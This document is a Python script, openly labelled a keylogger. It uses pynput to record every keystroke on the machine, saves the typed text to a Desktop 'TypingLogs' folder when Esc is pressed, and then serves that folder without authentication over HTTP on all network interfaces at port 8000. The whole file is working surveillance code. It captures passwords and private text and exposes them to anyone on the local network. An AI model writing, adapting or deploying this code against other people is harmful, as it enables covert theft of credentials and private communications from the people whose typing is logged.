from pynput import keyboard
from datetime import datetime
from pathlib import Path
import sys
import os
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ------------------ Keylogger ------------------ #
current_line = []
all_text = []

# Create folder on Desktop
desktop_path = Path.home() / "Desktop"
base_dir = desktop_path / "TypingLogs"
base_dir.mkdir(exist_ok=True)

def on_press(key):
    global current_line, all_text
    try:
        char = key.char
        current_line.append(char)
        all_text.append(char)
        print(char, end='', flush=True)
    except AttributeError:
        if key == keyboard.Key.space:
            current_line.append(' ')
            all_text.append(' ')
            print(' ', end='', flush=True)
        elif key == keyboard.Key.enter:
            print()
            all_text.append('\n')
            current_line = []
        elif key == keyboard.Key.backspace:
            if current_line:
                current_line.pop()
                if all_text:
                    all_text.pop()
                sys.stdout.write('\b \b')
                sys.stdout.flush()

def save_to_file():
    text = ''.join(all_text)
    word_count = len(text.split())
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_path = base_dir / f"log_{timestamp}.txt"

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(text)
        f.write(f"\n\n---\nWord count: {word_count}\n")

    print(f"\nSaved to: {file_path}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nStopping and saving...")
        save_to_file()
        return False

# ------------------ Run Keylogger ------------------ #
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# ------------------ HTTP Server ------------------ #
# Automatically detect the current username
username = os.getlogin()  # Windows username

# Path to serve
folder_to_serve = f"C:\\Users\\{username}\\Desktop\\TypingLogs"
os.makedirs(folder_to_serve, exist_ok=True)  # create if doesn't exist
os.chdir(folder_to_serve)

# Get local LAN IP dynamically
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
finally:
    s.close()

print(f"Serving files from {folder_to_serve} at http://{local_ip}:8000")

server_address = ("", 8000)  # listen on all interfaces
httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
httpd.serve_forever()